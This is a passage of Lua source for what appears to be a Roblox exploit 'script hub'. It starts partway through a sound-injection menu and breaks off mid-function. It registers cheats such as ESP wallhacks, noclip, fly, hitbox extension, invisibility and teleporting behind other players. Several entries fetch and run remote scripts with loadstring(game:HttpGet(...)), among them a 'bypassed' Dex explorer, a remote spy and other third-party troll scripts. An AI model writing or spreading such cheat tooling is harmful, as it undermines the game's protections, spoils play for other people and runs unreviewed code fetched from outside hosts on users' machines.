	Looped.Size = UDim2.new(0, 307, 0, 33)
	Looped.Visible = false
	Looped.Font = Enum.Font.Arial
	Looped.PlaceholderText = "Is it looped?, Type: False or True"
	Looped.Text = "False"
	Looped.TextColor3 = Color3.fromRGB(255, 255, 255)
	Looped.TextScaled = true
	Looped.TextSize = 14.000
	Looped.TextWrapped = true

	Exit.Name = "Exit"
	Exit.Parent = Frame
	Exit.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Exit.BorderColor3 = Color3.fromRGB(255, 0, 0)
	Exit.BorderSizePixel = 2
	Exit.Position = UDim2.new(0.921999991, 0, 0.0289999992, 0)
	Exit.Size = UDim2.new(0, 25, 0, 23)
	Exit.Image = "rbxassetid://14930908086"

	Frame2.Name = "Frame2"
	Frame2.Parent = SoundGui
	Frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Frame2.BorderSizePixel = 0
	Frame2.Position = UDim2.new(0.984443069, 0, 0.841666639, 0)
	Frame2.Size = UDim2.new(0, 25, 0, 23)
	Frame2.Visible = false

	Open.Name = "Open"
	Open.Parent = Frame2
	Open.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Open.BorderColor3 = Color3.fromRGB(255, 0, 0)
	Open.BorderSizePixel = 2
	Open.Position = UDim2.new(-0.0312646478, 0, -0.0113339629, 0)
	Open.Size = UDim2.new(0, 25, 0, 23)
	Open.Image = "rbxassetid://14930908086"

	-- Scripts:

	local function GSSVM_fake_script() -- AddSoundId.LocalScript 
		local script = Instance.new('LocalScript', AddSoundId)

		local parent = script.Parent

		parent.Activated:Connect(function()
			local SoundId = parent.Parent:WaitForChild("SoundIds").Text
			local Playbackspeed = parent.Parent:WaitForChild("PlayBackSpeed").Text
			local Volume = parent.Parent:WaitForChild("Volume").Text
			local looped = parent.Parent:WaitForChild("Looped").Text
			if SoundId == "" then
				parent.Text = "No Sound ID!"
				wait(2)
				parent.Text = "Add Sound!"
				return
			end

			local id = "rbxassetid://" .. SoundId
			local speed = tonumber(Playbackspeed) or 1
			local existingSound = game.Workspace:FindFirstChild("c00lsound23sas")

			if existingSound then
				existingSound.SoundId = id
				existingSound.PlaybackSpeed = speed
				existingSound.Volume = Volume
				if looped == "False" then
					existingSound.Looped = false
				elseif looped == "True"	then
					existingSound.Looped = true
				else
					existingSound.Looped = false
				end
				existingSound:Play()
			else
				local clonedSound = parent.Parent.c00lsound23sas:Clone()
				clonedSound.Parent = game.Workspace
				clonedSound.SoundId = id
				clonedSound.PlaybackSpeed = speed
				clonedSound.Volume = Volume
				if looped == "False" then
					clonedSound.Looped = false
				elseif looped == "True"	then
					clonedSound.Looped = true
				else
					clonedSound.Looped = false
				end
				clonedSound.Looped = looped

				clonedSound:Play()
			end

			parent.Text = "Injected Sound Succesfully!, Be sure to enter a correct ID if it doesnt work!"
			parent.TextScaled = true
			wait(3.5)
			parent.TextScaled = false
			parent.Text = "Add Sound!"
		end)

	end
	coroutine.wrap(GSSVM_fake_script)()
	local function MWUVEW_fake_script() -- Default.LocalScript 
		local script = Instance.new('LocalScript', Default)

		local parent = script.Parent
		local sound = parent.Parent.spoky

		parent.Activated:Connect(function()
			if sound.Playing == true then
				sound.Playing = false
			else
				sound.Playing = true
			end
		end)
	end
	coroutine.wrap(MWUVEW_fake_script)()
	local function BIKZQ_fake_script() -- Swap.LocalScript 
		local script = Instance.new('LocalScript', Swap)

		local parent = script.Parent
		local playback = parent.Parent.PlayBackSpeed
		local Sound = parent.Parent.SoundIds
		local volume = parent.Parent.Volume
		local looped = parent.Parent.Looped
		parent.Activated:Connect(function()
			if Sound.Visible == true then
				Sound.Visible = false
				playback.Visible = true
				volume.Visible = false
				looped.Visible = false

			elseif playback.Visible ==true then
				playback.Visible = false
				Sound.Visible = false
				volume.Visible = true
				looped.Visible = false

			elseif volume.Visible == true then
				Sound.Visible = false
				playback.Visible = false
				volume.Visible = false
				looped.Visible = true
			elseif looped.Visible == true then
				Sound.Visible = true
				playback.Visible = false
				volume.Visible = false
				looped.Visible = false
			end
		end)
	end
	coroutine.wrap(BIKZQ_fake_script)()
	local function AXYPXC_fake_script() -- Exit.LocalScript 
		local script = Instance.new('LocalScript', Exit)

		local parent = script.Parent
		local main = parent.Parent

		parent.Activated:Connect(function()
			main.Parent.Frame2.Visible = true
			main.Visible = false

		end)
	end
	coroutine.wrap(AXYPXC_fake_script)()
	local function WHTXC_fake_script() -- Open.LocalScript 
		local script = Instance.new('LocalScript', Open)

		local parent = script.Parent
		local main = parent.Parent.Parent.Frame

		parent.Activated:Connect(function()
			main.Visible = true
			parent.Parent.Visible = false
		end)
	end
	coroutine.wrap(WHTXC_fake_script)()
end, "General", "NOT FE")
FunctionManager:register("Bind Key", function()
	if bindFrame then return end 

	local gui = Player:FindFirstChild("PlayerGui"):FindFirstChild(die)
	if not gui then NotifyERROR("Gui not found!"); return end
	screenGui = gui

	bindFrame = Instance.new("Frame")
	bindFrame.Name = generate_string(math_random(1, 10))
	bindFrame.Size = UDim2.new(1,0,1,0)
	bindFrame.BackgroundColor3 = Color3.new(0,0,0)
	bindFrame.BackgroundTransparency = 0.5
	bindFrame.ZIndex = 50
	bindFrame.Parent = screenGui

	local panel = Instance.new("Frame")
	panel.Name = generate_string(math_random(1, 10))
	panel.Size = UDim2.new(0, 300, 0, 400)
	panel.Position = UDim2.new(0.5, -150, 0.5, -200)
	panel.BackgroundColor3 = Color3.fromRGB(35,35,35)
	panel.BorderSizePixel = 0
	panel.ZIndex = 51
	panel.Parent = bindFrame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 60, 0, 24)
	closeBtn.Position = UDim2.new(1, -64, 0, 4)
	closeBtn.Text = "Close"
	closeBtn.Font = Enum.Font.SourceSansBold
	closeBtn.TextSize = 14
	closeBtn.BackgroundColor3 = Color3.fromRGB(150,50,50)
	closeBtn.TextColor3 = Color3.new(1,1,1)
	closeBtn.ZIndex = 52
	closeBtn.Parent = panel
	closeBtn.MouseButton1Click:Connect(function()
		bindFrame:Destroy()
		bindFrame = nil
		if bindConn then bindConn:Disconnect(); bindConn = nil end
	end)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -8, 0, 24)
	title.Position = UDim2.new(0, 4, 0, 4)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.SourceSansBold
	title.TextSize = 18
	title.TextColor3 = Color3.new(1,1,1)
	title.Text = "Bind Key to Function"
	title.ZIndex = 52
	title.Parent = panel

	local list = Instance.new("ScrollingFrame")
	list.Size = UDim2.new(1, -8, 1, -40)
	list.Position = UDim2.new(0, 4, 0, 32)
	list.CanvasSize = UDim2.new(0,0,0,0)
	list.ScrollBarThickness = 6
	list.ZIndex = 51
	list.Parent = panel

	local uiList = Instance.new("UIListLayout")
	uiList.Padding = UDim.new(0,4)
	uiList.SortOrder = Enum.SortOrder.LayoutOrder
	uiList.Parent = list

	local function refreshList()
		for _, child in ipairs(list:GetChildren()) do
			if child:IsA("TextButton") or child:IsA("TextLabel") then
				child:Destroy()
			end
		end

		for _, cat in ipairs(FunctionManager.Categories) do
			local hdr = Instance.new("TextLabel")
			hdr.Size = UDim2.new(1,0,0,24)
			hdr.BackgroundTransparency = 1
			hdr.Font = Enum.Font.SourceSansBold
			hdr.TextSize = 16
			hdr.TextColor3 = Color3.new(1,1,0)
			hdr.Text = "["..cat.."]"
			hdr.ZIndex = 51
			hdr.Parent = list

			for name, cb in pairs(FunctionManager:getFunctionsInCategory(cat)) do
				local btn = Instance.new("TextButton")
				btn.Size = UDim2.new(1,0,0,24)
				btn.Font = Enum.Font.SourceSans
				btn.TextSize = 14
				btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
				btn.TextColor3 = Color3.new(1,1,1)
				btn.ZIndex = 51

				local bound = {}
				for key, fn in pairs(customBinds) do
					if fn == cb then table.insert(bound, tostring(key)) end
				end
				local suffix = #bound>0 and " ("..table.concat(bound, ",")..")" or ""
				btn.Text = name..suffix
				btn.Parent = list

				btn.MouseButton1Click:Connect(function()
					waitingBindFunction = { cb = cb, btn = btn, name = name }
					btn.Text = name.." → [Press a key]"
				end)
			end
		end

		list.CanvasSize = UDim2.new(0,0,0, uiList.AbsoluteContentSize.Y + 8)
	end
	bindConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed or not waitingBindFunction then return end
		if input.UserInputType == Enum.UserInputType.Keyboard then
			customBinds[input.KeyCode] = waitingBindFunction.cb
			waitingBindFunction.btn.Text = waitingBindFunction.name.." ("..tostring(input.KeyCode)..")"
			waitingBindFunction = nil
		end
	end)
	refreshList()

end, "Utility", "BUGGED")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.UserInputType == Enum.UserInputType.Keyboard then
		local fn = customBinds[input.KeyCode]
		if fn and type(fn) == "function" then
			pcall(fn)
		end
	end
end)
FunctionManager:register("JumpUp", function()
	local char = Player.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if hrp then hrp.Velocity = Vector3.new(0, 100, 0) end
end, "Movement", "Leap into the air!")


FunctionManager:register("Sit", function()
	local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
	if hum then hum.Sit = true end
end, "Movement", "SIT DOWN")


FunctionManager:register("INF JUMP", function()
	infJumpEnabled = not infJumpEnabled

	if infJumpEnabled then
		local debounce = false

		infJumpConnection = UserInputService.JumpRequest:Connect(function()
			if debounce then return end
			debounce = true

			local character = Player.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if humanoid then
				humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			end

			task.wait()
			debounce = false
		end)
	else
		if infJumpConnection then
			infJumpConnection:Disconnect()
			infJumpConnection = nil
		end
	end
end, "Movement", "Jump Forever!")

FunctionManager:register("WalkSpeed Slider", function()
	if screenGui:FindFirstChild("WalkSpeedModal") then return end


	local overlay = Instance.new("Frame")
	overlay.Name               = "WalkSpeedModal"
	overlay.Size               = UDim2.new(1,0,1,0)
	overlay.Position           = UDim2.new(0,0,0,0)
	overlay.BackgroundColor3   = Color3.new(0,0,0)
	overlay.BackgroundTransparency = 0.5
	overlay.ZIndex             = 50
	overlay.Parent             = screenGui

	local panel = Instance.new("Frame")
	panel.Name                  = "SliderPanel"
	panel.Size                  = UDim2.new(0, 300, 0, 100)
	panel.Position              = UDim2.new(0.5, -150, 0.5, -50)
	panel.BackgroundColor3      = Color3.fromRGB(40,40,40)
	panel.BorderSizePixel       = 0
	panel.ZIndex                = 51
	panel.Parent                = overlay

	local closeBtn = Instance.new("TextButton")
	closeBtn.Name               = "Close"
	closeBtn.Size               = UDim2.new(0,60,0,24)
	closeBtn.Position           = UDim2.new(1,-64,0,4)
	closeBtn.Font               = Enum.Font.SourceSansBold
	closeBtn.TextSize           = 14
	closeBtn.Text               = "Close"
	closeBtn.BackgroundColor3   = Color3.fromRGB(150,50,50)
	closeBtn.TextColor3         = Color3.new(1,1,1)
	closeBtn.ZIndex             = 52
	closeBtn.Parent             = panel
	closeBtn.MouseButton1Click:Connect(function()
		overlay:Destroy()
	end)

	local label = Instance.new("TextLabel")
	label.Name                  = "ValueLabel"
	label.Size                  = UDim2.new(1,-8,0,24)
	label.Position              = UDim2.new(0,4,0,4)
	label.BackgroundTransparency= 1
	label.Font                  = Enum.Font.SourceSansBold
	label.TextSize              = 18
	label.TextColor3            = Color3.new(1,1,1)
	label.Text                  = "WalkSpeed: " .. tostring(Humanoid.WalkSpeed)
	label.ZIndex                = 52
	label.Parent                = panel

	local track = Instance.new("Frame")
	track.Name                  = "Track"
	track.Size                  = UDim2.new(1,-16,0,20)
	track.Position              = UDim2.new(0,8,0,40)
	track.BackgroundColor3      = Color3.fromRGB(60,60,60)
	track.BorderSizePixel       = 0
	track.ZIndex                = 51
	track.Parent                = panel

	local fill = Instance.new("Frame")
	fill.Name                   = "Fill"
	fill.Size                   = UDim2.new(
		math.clamp((Humanoid.WalkSpeed - 8)/(100-8),0,1), 0,
		1, 0
	)
	fill.BackgroundColor3       = Color3.fromRGB(100,200,100)
	fill.BorderSizePixel        = 0
	fill.ZIndex                 = 52
	fill.Parent                 = track

	local dragging = false
	local minS, maxS = 8, 100

	local function update(x)
		local rel = math.clamp((x - track.AbsolutePosition.X)/track.AbsoluteSize.X, 0,1)
		local v = math.floor(minS + (maxS-minS)*rel)
		Humanoid.WalkSpeed = v
		label.Text = "WalkSpeed: "..v
		fill.Size = UDim2.new(rel,0,1,0)
	end

	track.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			update(i.Position.X)
		end
	end)
	track.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = false
		end
	end)
	UserInputService.InputChanged:Connect(function(i)
		if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
			update(i.Position.X)
		end
	end)
end, "Movement", "Control your walkspeed!")



FunctionManager:register("Server Hop", function()
	local success, res = pcall(function()
		return game:HttpGet(
			"https://games.roblox.com/v1/games/" ..
				PlaceId ..
				"/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
		)
	end)

	if not success then
		return NotifyERROR("[Server Hop] HTTP request failed")
	end

	local body
	local ok, err = pcall(function()
		body = HttpService:JSONDecode(res)
	end)
	if not ok or type(body) ~= "table" or type(body.data) ~= "table" then
		return NotifyERROR("[Server Hop] Invalid JSON response")
	end

	local servers = {}
	for _, v in ipairs(body.data) do
		if type(v) == "table"
			and tonumber(v.playing)
			and tonumber(v.maxPlayers)
			and v.playing < v.maxPlayers
			and v.id ~= JobId then
			table.insert(servers, v.id)
		end
	end

	if #servers == 0 then
		return NotifyERROR("[Server Hop] No available servers found")
	end

	local choice = servers[math.random(1, #servers)]
	TeleportService:TeleportToPlaceInstance(PlaceId, choice, Players.LocalPlayer)
end, "Utility","Changes Servers")

FunctionManager:register("TP Behind Closest", function()

	if not  HRP then
		NotifyERROR("No HumanoidRootPart found.")
		return
	end

	local closestPlayer
	local shortestDistance = math.huge


	for _, otherPlayer in ipairs(Players:GetPlayers()) do
		if otherPlayer ~= Player and otherPlayer.Character then
			local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
			if otherRoot then
				local distance = (otherRoot.Position - HRP.Position).Magnitude
				if distance < shortestDistance then
					shortestDistance = distance
					closestPlayer = otherPlayer
				end
			end
		end
	end

	if closestPlayer and closestPlayer.Character then
		local targetRoot = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
		if targetRoot then
			local behindPosition = targetRoot.CFrame.Position - targetRoot.CFrame.LookVector * 3
			local newCFrame = CFrame.new(behindPosition, targetRoot.Position) 
			HRP.CFrame = newCFrame
		end
	else
		NotifyERROR("No nearby player found.")
	end
end, "Movement", "Owai moi, shinderu. NANI?")
FunctionManager:register("Scare Closest Player", function()

	if not HRP then
		NotifyERROR("Could not find your HumanoidRootPart.")
		return
	end

	local closestPlayer, closestDistance = nil, math.huge
	for _, otherPlayer in ipairs(Players:GetPlayers()) do
		if otherPlayer ~= Player and otherPlayer.Character then
			local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
			if otherRoot then
				local dist = (otherRoot.Position - HRP.Position).Magnitude
				if dist < closestDistance then
					closestDistance = dist
					closestPlayer = otherPlayer
				end
			end
		end
	end

	if closestPlayer and closestPlayer.Character then
		local targetRoot = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
		if targetRoot then
			local oldPos = HRP.CFrame
			HRP.CFrame = targetRoot.CFrame + targetRoot.CFrame.lookVector * 2
			HRP.CFrame = CFrame.new(HRP.Position, targetRoot.Position)
			task.wait(0.5)
			HRP.CFrame = oldPos
		end
	else
		NotifyERROR("No target player nearby.")
	end
end, "Fun", "FNAF reference")
FunctionManager:register("ESP Toggle", function()
	espOn = not espOn
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr.Character and plr ~= Player then
			local head = plr.Character:FindFirstChild("Head")
			if head then
				local bb = head:FindFirstChild("ESP") or Instance.new("BillboardGui", head)
				bb.Name = "ESP"
				bb.Size = UDim2.new(0,80,0,20)
				bb.AlwaysOnTop = true
				local lbl = bb:FindFirstChild("Name") or Instance.new("TextLabel", bb)
				lbl.Name = "Name"
				lbl.BackgroundTransparency = 1
				lbl.Size = UDim2.new(1,0,1,0)
				lbl.TextColor3 = Color3.new(1,0,0)
				lbl.TextScaled = true
				lbl.Text = plr.Name
				bb.Enabled = espOn
			end
		end
	end
	Notify("ESP " .. (espOn and "Enabled" or "Disabled"), "SYSTEM", 3)
end, "Visual", "ur cooked i just got wallhacks")
FunctionManager:register("JumpPowerSlider", function()
	if screenGui:FindFirstChild("JumpPowerModal") then return end
	Humanoid.UseJumpPower = true
	local overlay = Instance.new("Frame")
	overlay.Name               = "JumpPowerModal"
	overlay.Size               = UDim2.new(1,0,1,0)
	overlay.Position           = UDim2.new(0,0,0,0)
	overlay.BackgroundColor3   = Color3.new(0,0,0)
	overlay.BackgroundTransparency = 0.5
	overlay.ZIndex             = 50
	overlay.Parent             = screenGui


	local panel = Instance.new("Frame")
	panel.Name                  = "JumpPanel"
	panel.Size                  = UDim2.new(0, 300, 0, 100)
	panel.Position              = UDim2.new(0.5, -150, 0.5, -50)
	panel.BackgroundColor3      = Color3.fromRGB(40,40,40)
	panel.BorderSizePixel       = 0
	panel.ZIndex                = 51
	panel.Parent                = overlay


	local closeBtn = Instance.new("TextButton")
	closeBtn.Name               = "Close"
	closeBtn.Size               = UDim2.new(0,60,0,24)
	closeBtn.Position           = UDim2.new(1,-64,0,4)
	closeBtn.Font               = Enum.Font.SourceSansBold
	closeBtn.TextSize           = 14
	closeBtn.Text               = "Close"
	closeBtn.BackgroundColor3   = Color3.fromRGB(150,50,50)
	closeBtn.TextColor3         = Color3.new(1,1,1)
	closeBtn.ZIndex             = 52
	closeBtn.Parent             = panel
	closeBtn.MouseButton1Click:Connect(function()
		overlay:Destroy()
	end)


	local label = Instance.new("TextLabel")
	label.Name                  = "ValueLabel"
	label.Size                  = UDim2.new(1,-8,0,24)
	label.Position              = UDim2.new(0,4,0,4)
	label.BackgroundTransparency= 1
	label.Font                  = Enum.Font.SourceSansBold
	label.TextSize              = 18
	label.TextColor3            = Color3.new(1,1,1)
	label.Text                  = "JumpPower: " .. tostring(Humanoid.JumpPower)
	label.ZIndex                = 52
	label.Parent                = panel


	local track = Instance.new("Frame")
	track.Name                  = "Track"
	track.Size                  = UDim2.new(1,-16,0,20)
	track.Position              = UDim2.new(0,8,0,40)
	track.BackgroundColor3      = Color3.fromRGB(60,60,60)
	track.BorderSizePixel       = 0
	track.ZIndex                = 51
	track.Parent                = panel

	local fill = Instance.new("Frame")
	fill.Name                   = "Fill"
	fill.Size                   = UDim2.new(
		math.clamp((Humanoid.JumpPower - 50)/(200-50),0,1), 0,
		1, 0
	)
	fill.BackgroundColor3       = Color3.fromRGB(100,200,100)
	fill.BorderSizePixel        = 0
	fill.ZIndex                 = 52
	fill.Parent                 = track


	local dragging = false
	local minJ, maxJ = 50, 200

	local function update(x)
		local rel = math.clamp((x - track.AbsolutePosition.X)/track.AbsoluteSize.X, 0,1)
		local v = math.floor(minJ + (maxJ-minJ)*rel)
		Humanoid.JumpPower = v
		label.Text = "JumpPower: "..v
		fill.Size = UDim2.new(rel,0,1,0)
	end

	track.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			update(i.Position.X)
		end
	end)
	track.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = false
		end
	end)
	UserInputService.InputChanged:Connect(function(i)
		if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
			update(i.Position.X)
		end
	end)
end, "Movement", "Control your jumppower")



FunctionManager:register("Spin Bot", function()
	spinOn = not spinOn
	if spinOn then
		if not HRP then return NotifyERROR("No HRP!") end


		lockBP = Instance.new("BodyPosition")
		lockBP.Name = "SpinLockBP"
		lockBP.Position = HRP.Position
		lockBP.MaxForce = Vector3.new(1e6, 1e6, 1e6)
		lockBP.P = 1e5
		lockBP.D = 0
		lockBP.Parent = HRP


		spinBAV = Instance.new("BodyAngularVelocity")
		spinBAV.Name = "SpinBAV"
		spinBAV.AngularVelocity = Vector3.new(0, 10000, 0) 
		spinBAV.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
		spinBAV.P = 1e5
		spinBAV.Parent = HRP

		NotifyERROR("Spin Bot On")
	else
		if spinBAV then
			spinBAV:Destroy()
			spinBAV = nil
		end
		if lockBP then
			lockBP:Destroy()
			lockBP = nil
		end
		NotifyERROR("Spin Bot Off")
	end
end, "Visual", "Speeeeen")

FunctionManager:register("TP To Mouse", function()
	if hit then
		HRP.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
		warn("Teleported to mouse")
	end
end, "Movement", "BUGGED")
FunctionManager:register("Save Position", function()
	savedCFrame = HRP.CFrame
	Notify("Position Saved", "SYSTEM", 3)
end, "Utility", "Checkpoint")
FunctionManager:register("Load Position", function()
	if savedCFrame then
		HRP.CFrame = savedCFrame
		Notify("Position Loaded", "SYSTEM", 3)
	else
		NotifyERROR("No Position Saved")
	end
end, "Utility", "Reload")


FunctionManager:register("No‑Clip", function()
	noclipOn = not noclipOn

	if noclipOn then
		hoverHeight = HRP.Position.Y

		while noclipOn == true do
			task.wait(0.01)
		
			for _, part in ipairs(Character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.CanCollide = false
				end
			end

			local pos = HRP.Position
			HRP.CFrame = CFrame.new(pos.X, hoverHeight, pos.Z)
		end

		Notify("No‑Clip ON (locked at height)", "SYSTEM", 3)
	else
		for _, part in ipairs(Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.CanCollide = true
			end
		end
		Notify("No‑Clip OFF", "SYSTEM", 3)
	end
end, "Movement", "NOCLIP")

FunctionManager:register("DarkDex", function()
	--Maybe works?
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()	
end, "General", "Take a peek under the hood")
FunctionManager:register("SimpleSpy", function()
	--also maybe works?
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
end, "Catch remotes")
FunctionManager:register("Orbit All Nearby Parts", function()
	local radius = 20
	local height = 3
	local orbitSpeed = 2

	local speaker = Players.LocalPlayer
	local character = speaker.Character or speaker.CharacterAdded:Wait()
	local root = character:FindFirstChild("HumanoidRootPart")
	if not root then
		NotifyERROR("No HumanoidRootPart found.")
		return
	end

	local origin = root.Position
	local orbitParts = {}

	for _, part in ipairs(workspace:GetDescendants()) do
		if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(workspace.Terrain) then
			local isInCharacter = false

			for _, player in ipairs(Players:GetPlayers()) do
				local char = player.Character
				if char and part:IsDescendantOf(char) then
					isInCharacter = true
					break
				end
			end


			if not isInCharacter and (part.Position - origin).Magnitude <= radius then
				if not CollectionService:HasTag(part, "OrbitPart") then
					if part:CanSetNetworkOwnership() then
						part:SetNetworkOwner(speaker)
					else
						warn("Cannot set network owner for part:", part.Name)
					end
					part.CanCollide = false
					CollectionService:AddTag(part, "OrbitPart")
					table.insert(orbitParts, part)
				end

			end
		end
	end

	if #orbitParts == 0 then
		warn("No parts found for orbit.")
		return
	end

	local angleOffset = 2 * math.pi / #orbitParts

	for i, part in ipairs(orbitParts) do
		local angle = angleOffset * i

		local startPos = root.Position + Vector3.new(
			math.cos(angle) * radius,
			height,
			math.sin(angle) * radius
		)

		part.Position = startPos

		local bodyGyro = Instance.new("BodyGyro")
		bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
		bodyGyro.P = 1e4
		bodyGyro.CFrame = CFrame.new(part.Position, root.Position)
		bodyGyro.Parent = part

		local bodyVel = Instance.new("BodyVelocity")
		bodyVel.MaxForce = Vector3.new(1e5, 1e5, 1e5)
		bodyVel.P = 1e4
		bodyVel.Parent = part

		local conn
		conn = RunService.Heartbeat:Connect(function(dt)
			if not root or not root.Parent then
				conn:Disconnect()
				return
			end

			angle += orbitSpeed * dt

			local orbitCenter = root.Position
			local orbitPoint = orbitCenter + Vector3.new(
				math.cos(angle) * radius,
				height,
				math.sin(angle) * radius
			)

			local tangent = Vector3.new(
				-math.sin(angle),
				0,
				math.cos(angle)
			).Unit * orbitSpeed * radius

			bodyVel.Velocity = tangent
			bodyGyro.CFrame = CFrame.new(part.Position, orbitCenter)
			part.Position = orbitPoint
		end)
	end

	warn("Orbiting", #orbitParts, "parts around you.")
end, "Fun", "You have to be near the parts for a while for it to work")


local function toggleInvisibility()
	if invisRunning then return end
	invisRunning = true

	local player = Players.LocalPlayer
	repeat task.wait(0.1) until player.Character
	local originalChar = player.Character
	originalChar.Archivable = true

	local invisibleChar = originalChar:Clone()
	invisibleChar.Name   = ""
	invisibleChar.Parent = Lighting

	-- clone transparency
	for _, part in ipairs(invisibleChar:GetDescendants()) do
		if part:IsA("BasePart") then
			part.Transparency = (part.Name == "HumanoidRootPart") and 1 or 0.5
		end
	end

	-- we’ll need these in nested functions:
	local isInvis = false
	local voidConn, deathConn, steppedConn

	-- Respawn helper (puts you back to originalChar)
	local function Respawn()
		invisRunning = false
		if steppedConn then steppedConn:Disconnect() end
		if deathConn   then deathConn:Disconnect()   end

		player.Character = originalChar
		originalChar.Parent = workspace
		-- destroy the extra humanoid
		local clonedHum = originalChar:FindFirstChildWhichIsA("Humanoid")
		if clonedHum then clonedHum:Destroy() end

		invisibleChar.Parent = nil
	end

	-- fix for falling through the void
	local voidY = workspace.FallenPartsDestroyHeight
	steppedConn = RunService.Stepped:Connect(function()
		local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		local y = hrp.Position.Y
		if (voidY < 0 and y <= voidY) or (voidY >= 0 and y >= voidY) then
			Respawn()
		end
	end)

	-- if cloned character dies
	local clonedHum = invisibleChar:FindFirstChildWhichIsA("Humanoid")
	deathConn = clonedHum.Died:Connect(Respawn)

	-- now swap them
	local camCF = workspace.CurrentCamera.CFrame
	local hrpCF = originalChar.HumanoidRootPart.CFrame

	originalChar:MoveTo(Vector3.new(0, math.pi*1e6, 0))
	workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
	task.wait(0.2)
	workspace.CurrentCamera.CameraType = Enum.CameraType.Custom

	invisibleChar.Parent = workspace
	invisibleChar.HumanoidRootPart.CFrame = hrpCF
	player.Character = invisibleChar

	-- re‑enable animations
	for _, a in ipairs(player.Character:GetDescendants()) do
		if a.Name == "Animate" and a:IsA("Model") then
			a.Disabled = true; a.Disabled = false
		end
	end
	workspace.CurrentCamera:remove()
	wait(.1)
	repeat wait() until player.Character ~= nil
	workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
	workspace.CurrentCamera.CameraType = "Custom"
	player.CameraMinZoomDistance = 0.5
	player.CameraMaxZoomDistance = 400
	player.CameraMode = "Classic"
	player.Character.Head.Anchored = false
	player.Character.Animate.Enabled = false
	player.Character.Animate.Enabled = true
	Notify("You are now invisible!", "System", 3)
end

FunctionManager:register(
	"Invisible",
	toggleInvisibility,
	"Fun",
	"Make your character invisible until you respawn or die"
)


FunctionManager:register("Fly", function()
	if not HRP then
		warn("No HumanoidRootPart found; cannot fly.")
		return
	end

	flyingEnabled = not flyingEnabled

	if flyingEnabled then

		flyBG = Instance.new("BodyGyro")
		flyBG.P = 9e4
		flyBG.MaxTorque = Vector3.new(9e4, 9e4, 9e4)
		flyBG.CFrame = HRP.CFrame
		flyBG.Parent = HRP


		flyBV = Instance.new("BodyVelocity")
		flyBV.MaxForce = Vector3.new(9e4, 9e4, 9e4)
		flyBV.Velocity = Vector3.new(0, 0, 0)
		flyBV.Parent = HRP

		flyConn = RunService.Heartbeat:Connect(function()
			local camCFrame = workspace.CurrentCamera.CFrame
			local dir = Vector3.new()

			if UserInputService:IsKeyDown(Enum.KeyCode.W) then
				dir = dir + camCFrame.LookVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.S) then
				dir = dir - camCFrame.LookVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.A) then
				dir = dir - camCFrame.RightVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.D) then
				dir = dir + camCFrame.RightVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
				dir = dir + Vector3.new(0, 1, 0)
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
				dir = dir - Vector3.new(0, 1, 0)
			end

			if dir.Magnitude > 0 then
				dir = dir.Unit * 50
			end
			flyBV.Velocity = dir
			flyBG.CFrame = CFrame.new(HRP.Position, HRP.Position + camCFrame.LookVector)
		end)

	else
		if flyConn then flyConn:Disconnect() flyConn = nil end
		if flyBG then flyBG:Destroy() flyBG = nil end
		if flyBV then flyBV:Destroy() flyBV = nil end


	end
end, "Movement", "Fly around!")

FunctionManager:register("HatHub", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()
end, "Troll", "Credits to original maker!")
FunctionManager:register("Hitbox Extender", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/AAPVdev/scripts/refs/heads/main/UI_LimbExtender.lua'))()
end, "Troll", "Extends hitboxes")
FunctionManager:register("Part Grab", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Unachored_parts_controller_v2.lua.txt"))()
end, "Troll", "Much better part grab")
FunctionManager:register("Hat Script", function()
